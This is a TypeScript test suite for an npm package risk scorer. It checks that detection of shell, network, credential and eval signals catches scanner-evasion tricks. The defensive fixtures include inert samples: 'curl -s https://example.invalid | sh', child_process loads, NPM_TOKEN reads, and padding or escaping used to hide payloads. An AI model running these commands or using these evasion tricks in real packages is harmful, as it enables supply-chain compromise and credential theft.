// Every counterexample from the independent review of apm-score-v7 (apmjs-bughunt/sol-v7/REPORT.md), scored by v8,
// and the proofs v8 keeps. All are inert: a builtin load of child_process, fetch to example.invalid, a token name and
// eval('1'), with nothing run here. Each is the main file of an MIT package with no other deductions; `extra` adds
// files, and `pad` puts one behind filler that keeps it from being parsed (`js`: 240,001 `0;` statements; `ts`: a
// 1 MB comment).
//
// v7 kept every finding apm-score-v3 made in code unless the tree proved it harmless. The review found seven kinds of
// proof that were wrong: 39 programs (`runs-all`) run every payload operation the proof had removed, and 3 more
// (`runs-then-throws`) load child_process before they throw. v8 keeps only the proofs that rest on how the code is
// read, so each scores exactly what v3 scores, which this file checks against the v3 reference itself.
import { describe, expect, test } from "bun:test";
import { z } from "zod";
import { analyze, finalize, POINTS, POSSIBLE_POINTS, SCORE_FLOOR, type ScoreReport, type TarEntry } from "../src/index.ts";
import { TEXT_MATCH } from "../src/score.ts";
import { scanFile, scanText, TOKEN_WINDOW, tokenWindows, type CodeSignal, type Confidence, type Lang } from "../src/source.ts";
import { tokenText } from "../src/tokens.ts";
import lexerData from "./fixtures/sol-lexer.json";
import v5Data from "./fixtures/sol-parser-v5.json";
import v6Data from "./fixtures/sol-parser-v6.json";
import fixtureData from "./fixtures/sol-v7.json";
import { analyze as analyzeV3, finalize as finalizeV3 } from "./v3/score.ts";
import { scanText as scanTextV3 } from "./v3/source.ts";

const Signal = z.enum(["shell-exec", "network", "credential-access", "eval", "obfuscated"]);

const Fixture = z.object({
  name: z.string(),
  group: z.enum(["conversion", "eval-binding", "with", "default-parameter", "reflected-name", "unparsed-builtin", "data-fetch"]),
  kind: z.enum(["runs-all", "runs-then-throws"]),
  file: z.string(),
  src: z.string(),
  extra: z.record(z.string(), z.object({ pad: z.enum(["js", "ts"]).optional(), src: z.string() })).optional(),
  runs: z.array(z.string()),
  v3: z.number(),
  v7: z.number(),
  v8: z.number(),
  signals: z.partialRecord(Signal, z.enum(["confirmed", "possible"])),
});

type Fixture = z.infer<typeof Fixture>;

const fixtures = z.array(Fixture).parse(fixtureData);

const PADDING = { js: "0;".repeat(240_001), ts: `/*${"x".repeat(1024 * 1024)}*/\n` } as const;

const STATE = { publishedAt: 0, now: 1e13, deprecated: null, status: "active", statusReason: null } as const;

const possiblePoints = new Map<string, number>(Object.entries(POSSIBLE_POINTS));

function entry(path: string, text: string): TarEntry {
  const data = new TextEncoder().encode(text);

  return { path, size: data.length, mode: 0o644, data };
}

/** A package whose main file is `main`, and the input both scorers take. */
function input(files: Record<string, string>, main: string) {
  const manifest = { name: "probe-pkg", version: "1.0.0", license: "MIT", main };

  return { name: "probe-pkg", manifest, files: [entry("package.json", JSON.stringify(manifest)), ...Object.entries(files).map(([p, t]) => entry(p, t))], publisher: "a", previousPublishers: [] };
}

function filesOf(f: Fixture) {
  return { [f.file]: f.src, ...Object.fromEntries(Object.entries(f.extra ?? {}).map(([p, e]) => [p, (e.pad ? PADDING[e.pad] : "") + e.src])) };
}

function score(files: Record<string, string>, main: string): ScoreReport {
  return finalize(analyze(input(files, main)), STATE);
}

function scoreV3(files: Record<string, string>, main: string): number {
  return finalizeV3(analyzeV3(input(files, main)), STATE).score;
}

type Found = Partial<Record<CodeSignal, Confidence>>;

function found(text: string, lang: Lang = "js"): Found {
  const out: Found = {};

  for (const f of scanText(text, lang)) if (out[f.id] !== "confirmed") out[f.id] = f.confidence;

  return out;
}

const P = "process.getBuiltinModule('chi'+'ld_process');fetch('https://example.invalid');process.env.NPM_TOKEN;eval('1')";

describe("the v7 review's counterexamples", () => {
  test("all are here: 39 that run every operation, in seven proof classes, and 3 that run a builtin load and throw", () => {
    expect(fixtures.length).toBe(42);
    expect(fixtures.filter((f) => f.kind === "runs-all").length).toBe(39);

    const byGroup = Object.fromEntries(Object.entries(Object.groupBy(fixtures, (f) => f.group)).map(([g, list]) => [g, list?.length ?? 0]));

    expect(byGroup).toEqual({ conversion: 8, "eval-binding": 5, with: 4, "default-parameter": 3, "reflected-name": 14, "unparsed-builtin": 6, "data-fetch": 2 });
    // each one scored above v3 under apm-score-v7 while the operation ran
    expect(fixtures.every((f) => f.v7 > f.v3 && f.runs.length > 0)).toBe(true);
  });

  for (const f of fixtures) {
    test(`${f.group}: ${f.name}`, () => {
      const files = filesOf(f);
      const r = score(files, f.file);
      const v3 = scoreV3(files, f.file);
      const signals = Object.fromEntries(r.signals.filter((s) => s.id in POSSIBLE_POINTS).map((s) => [s.id, s.confidence]));

      expect(v3).toBe(f.v3);
      expect(r.score).toBe(f.v8);
      expect(r.score).toBeLessThanOrEqual(v3);
      expect(r.score < SCORE_FLOOR).toBe(v3 < SCORE_FLOOR);
      expect(signals).toEqual(f.signals);

      for (const s of r.signals) {
        if (!(s.id in POSSIBLE_POINTS)) continue;
        const confirmed = s.confidence === "confirmed";
        expect(s.points, `${s.id} points`).toBe(confirmed ? POINTS[s.id] : (possiblePoints.get(s.id) ?? Number.NaN));
      }
    });
  }

  test("no score says a file could replace a builtin: no proof rests on one", () => {
    for (const f of fixtures.filter((x) => x.group === "unparsed-builtin" || x.group === "data-fetch")) {
      expect(score(filesOf(f), f.file).notChecked.some((n) => n.includes("could replace those builtins")), f.name).toBe(false);
    }
  });
});

describe("what v8 still leaves out: text the parse says is not code", () => {
  test("comments, ended by every ECMAScript line terminator", () => {
    for (const end of ["\n", "\r", "\r\n", " ", " "]) {
      expect(found(`// fetch('https://example.invalid')${end}module.exports = 1;\n`), JSON.stringify(end)).toEqual({});
      // what follows the terminator is code, however the line looks
      expect(found(`// note${end}fetch('https://example.invalid');\n`), JSON.stringify(end)).toEqual({ network: "confirmed" });
    }

    expect(found("/* require('child_process') */ module.exports = 1;\n")).toEqual({});
  });

  test("HTML-like comments hide text only in a script; the module reading of the same file counts it", () => {
    // a script hides the rest of the line; as a module the same text is `a < !--b`, then a call, and runs
    expect(found("var a = 1, b = 2, x;\nx = a <!--b; require('child_process')\n")).toEqual({ "shell-exec": "confirmed" });
    expect(found("<!-- require('child_process')\nmodule.exports = 1;\n")).toEqual({});
    expect(found("--> require('child_process')\nmodule.exports = 1;\n")).toEqual({});
  });

  test("a hashbang is a comment, in JavaScript and in TypeScript", () => {
    expect(found("#!/usr/bin/env node curl -s https://example.invalid | sh\nmodule.exports = 1;\n")).toEqual({});
    expect(found("#!/usr/bin/env node curl -s https://example.invalid | sh\nexport const x: number = 1;\n", "ts")).toEqual({});
  });

  test("regex bodies, except after an await, which a script reads as a division", () => {
    expect(found("const r = /curl -s x | sh/;\nmodule.exports = r;\n")).toEqual({});
    // in a script `await` is a name, so `await /…/g` divides, and the call between the slashes runs
    expect(found("await /fetch('https:\\/\\/example.invalid')/g;\n")).toEqual({ network: "confirmed" });
  });

  test("TypeScript that emits nothing: annotations, interfaces, type aliases, type imports and exports, declare, overloads", () => {
    const erased = [
      "let a: typeof fetch;",
      "function f(p: import('child_process').ChildProcess): void {}",
      "interface I { fetch(u: string): void; npmrc: '.npmrc' }",
      "type T = import('net').Socket;",
      "import type { ChildProcess } from 'child_process';",
      "export type { Socket } from 'net';",
      "export type * from 'child_process';",
      "declare const fetchIt: (u: 'https://example.invalid') => void;",
      "declare function exec(c: 'curl -s x | sh'): void;",
      "declare module 'child_process' {}",
      "class A { declare npm: 'NPM_TOKEN'; run(u: string): void; run(u?: string) {} }",
      "abstract class B { abstract fetch(u: string): void; abstract token: 'NPM_TOKEN' }",
      "function g<T extends 'child_process'>(x: T): T { return x }",
    ];

    for (const src of erased) expect(found(`${src}\n`, "ts"), src).toEqual({});
  });

  test("TypeScript that emits code counts: enums, namespaces, parameter properties, decorators, import = require", () => {
    expect(found("enum E { A = 'child_process' }\n", "ts")).toEqual({ "shell-exec": "confirmed" });
    expect(found("namespace N { export const t = 'NPM_TOKEN' }\n", "ts")).toEqual({ "credential-access": "confirmed" });
    expect(found("class C { constructor(public NPM_TOKEN = 1) {} }\n", "ts")).toEqual({ "credential-access": "confirmed" });
    expect(found("function d(...a: unknown[]) {}\n@d class C { @d m() { fetch('https://example.invalid') } }\n", "ts")).toEqual({ network: "confirmed" });
    expect(found("import cp = require('child_process');\n", "ts")).toEqual({ "shell-exec": "confirmed" });
    // an abstract field with an initializer is read as code
    expect(found("abstract class B { abstract t = 'NPM_TOKEN' }\n", "ts")).toEqual({ "credential-access": "confirmed" });
  });

  test("a TypeScript file that is also valid JavaScript is read as JavaScript too", () => {
    // TypeScript reads a call with a type argument; older node, which loads it as JavaScript, imports child_process
    const both = "f<import('child_process').ChildProcess>(0);\n";

    expect(found(both, "ts")).toEqual({ "shell-exec": "confirmed" });
    expect(scoreV3({ "index.ts": both }, "index.ts")).toBeGreaterThanOrEqual(score({ "index.ts": both }, "index.ts").score);
  });

  test("a type declaration nothing loads is data; one code loads runs and is read as TypeScript", () => {
    const decl = "fetch('https://example.invalid');\nexport declare const x: number;\n";

    expect(score({ "index.js": "module.exports = 1;\n", "types.d.ts": decl }, "index.js").signals.map((s) => s.id)).not.toContain("network");
    expect(score({ "index.js": "require('./types.d.ts');\n", "types.d.ts": decl }, "index.js").signals.find((s) => s.id === "network")?.confidence).toBe("confirmed");
  });
});

describe("evidence says when only a text rule matched", () => {
  test("a definition named fetch is cited as a text match; a call the tree saw is not", () => {
    const text = score({ "index.js": "class A { fetch(u) { return u } }\nmodule.exports = A;\n" }, "index.js");
    const call = score({ "index.js": "fetch('https://example.invalid');\n" }, "index.js");

    expect(text.signals.find((s) => s.id === "network")?.evidence).toEqual([`index.js:1: class A { fetch(u) { return u } }${TEXT_MATCH}`]);
    expect(call.signals.find((s) => s.id === "network")?.evidence).toEqual(["index.js:1: fetch('https://example.invalid');"]);
  });

  test("the note comes before the test-file mark, which stays last", () => {
    const r = score({ "index.js": "module.exports = 1;\n", "a.test.js": "const names = ['child_process'];\n" }, "index.js");

    expect(r.signals.find((s) => s.id === "shell-exec")?.evidence[0]).toBe(`a.test.js:1: const names = ['child_process'];${TEXT_MATCH} (in a test file)`);
  });
});

describe("raw text is read with apm-score-v3's own rules", () => {
  // every source of every stored review fixture, read raw: v8's rules find every signal v3's rules found
  const sources = [...lexerData, ...v5Data, ...v6Data, ...fixtures].map((f) => f.src);

  test(`on ${sources.length} review sources, a raw read finds every signal v3 found`, () => {
    for (const src of sources) {
      const v3 = new Set(scanTextV3(src).map((f) => f.id));
      const v8 = new Set(scanText(src, "plain").filter((f) => f.confidence === "confirmed").map((f) => f.id));

      expect([...v3].filter((id) => !v8.has(id)), src.slice(0, 80)).toEqual([]);
    }
  });

  test("v3's spellings the newer rules skipped", () => {
    const cases: [string, CodeSignal][] = [
      ["fetch('data:,x')", "network"],
      ["$fetch('https://example.invalid')", "network"],
      ["$eval('1')", "eval"],
      ["const lookup = dns.lookup", "network"],
      ["process.env.MY_AWS_SECRET_ACCESS_KEY", "credential-access"],
      ["xglobal.require('x')", "eval"],
      [`const w = "${"A".repeat(2400)}"`, "obfuscated"],
      [`const e = "${"\\x00".repeat(40)}"`, "obfuscated"],
    ];

    for (const [src, id] of cases) {
      expect(scanTextV3(src).map((f) => f.id), src.slice(0, 40)).toContain(id);
      expect(found(src, "plain")[id], src.slice(0, 40)).toBe("confirmed");
      expect(found(src, "js")[id], src.slice(0, 40)).toBe("confirmed");
    }
  });

  test("C and Python are read raw, comments and strings included", () => {
    expect(found("/* fetch( */ int main() { return 0; }\n", "c")).toEqual({ network: "confirmed" });
    expect(found("cmd = 'curl -s https://example.invalid | sh'\nos.system(cmd)\n", "python")).toMatchObject({ "shell-exec": "confirmed" });
  });

  test("every path v3's pattern finds is read, so a document code names is read as v3 read it", () => {
    const files = { "index.js": "const notes = require('path').join(__dirname, 'notes.md');\nmodule.exports = notes;\n", "notes.md": "curl -s https://example.invalid | sh\n" };

    expect(score(files, "index.js").signals.find((s) => s.id === "shell-exec")?.confidence).toBe("confirmed");
    expect(score(files, "index.js").score).toBeLessThanOrEqual(scoreV3(files, "index.js"));
  });
});

describe("the token windows of a file with no tree", () => {
  const W = TOKEN_WINDOW;

  test("a `;` inside a for header or a function argument is not a statement end", () => {
    const small = "fetch((()=>{for(let i=0;i<1;i++){}return 'x'})());";
    const header = [small.indexOf(";") + 1, small.indexOf(";", small.indexOf(";") + 1) + 1];

    // with a step longer than the program, only the statement's own `;` is offered
    expect(tokenText(small, 30)?.cuts).toEqual([small.length]);

    // a 20-character step is due at both header `;`s (24 and 28), which v7 took; v8 waits for a statement end and,
    // with none before 40, falls back to the first token past 40
    const cuts = tokenText(small, 20)?.cuts ?? [];

    expect(cuts.filter((c) => header.includes(c))).toEqual([]);
    expect(cuts[0]).toBeGreaterThanOrEqual(40);
  });

  test("a file with no statement ends still gets cuts, so no window grows past its size and a step", () => {
    // 4.4 MB of real tokens and not one semicolon: a statement per line, ASI between them
    const text = `${"x\n".repeat(2_200_000)}f\\u0065tch/*${"y".repeat(70_000)}*/('https://example.invalid')\n`;
    const tokens = tokenText(text);

    expect(tokens).not.toBeNull();

    if (!tokens) return;
    const windows = tokenWindows(tokens.text.length, tokens.cuts);

    expect(windows.length).toBeGreaterThan(1);
    expect(Math.max(...windows.map((w) => w.end - w.from))).toBeLessThanOrEqual(W + 3 * 256 * 1024);

    const scan = scanFile(text, "js");

    expect(scan.read).toBe("raw");
    expect(scan.findings.find((f) => f.id === "network")).toMatchObject({ confidence: "confirmed", line: 2_200_001 });
  });

  test("a long array with no top-level `;` is cut between tokens, and a call across a cut is still read", () => {
    const text = `x=[${"0,".repeat(2_400_000)}0];f\\u0065tch('https://example.invalid')`;
    const tokens = tokenText(text);

    expect(tokens).not.toBeNull();

    if (!tokens) return;
    expect(Math.max(...tokenWindows(tokens.text.length, tokens.cuts).map((w) => w.end - w.from))).toBeLessThanOrEqual(W + 3 * 256 * 1024);
    expect(scanFile(text, "js").findings.find((f) => f.id === "network")?.confidence).toBe("confirmed");
  });

  test("the review's large-window programs are read whole: an escaped fetch, a call after a long comment", () => {
    const programs = [
      ...[0, 65_500, 150_000].map((gap) => `/*${"x".repeat(W - 104)}*/\nf\\u0065tch/*${"x".repeat(gap)}*/('https://example.invalid')`),
      `/*${"x".repeat(W - 100)}*/\n0\n/*${"y".repeat(150_000)}*/\nf\\u0065tch('https://example.invalid')`,
      `${"0;".repeat(240_001)}/*${"x".repeat(W - 480_050)}*/f\\u0065tch/*${"y".repeat(70_000)}*/('https://example.invalid');0;`,
      `/*${"x".repeat(W - 40)}*/f\\u0065tch((()=>{for(let i=0;i<1;i++){}return 'https://example.invalid'})());`,
    ];

    for (const src of programs) {
      const r = score({ "index.ts": src }, "index.ts");

      expect(r.signals.find((s) => s.id === "network")?.confidence, src.slice(-60)).toBe("confirmed");
      expect(r.score).toBeLessThanOrEqual(scoreV3({ "index.ts": src }, "index.ts"));
    }
  });

  test("a citation from the token pass points at the file as written, past every shortened gap", () => {
    const text = `}\n/*${"x\n".repeat(5000)}*/\nf\\u0065tch('https://example.invalid');\n`;
    const network = scanFile(text, "js").findings.find((f) => f.id === "network");

    expect(network?.line).toBe(5003);
    expect(network?.snippet).toContain("f\\u0065tch");
  });

  test("a package refused by v3 is refused when its payload sits in a padded, semicolonless file", () => {
    const src = `${"x\n".repeat(2_200_000)}${P}\n`;

    expect(score({ "index.js": src }, "index.js").score).toBeLessThan(SCORE_FLOOR);
  });
});
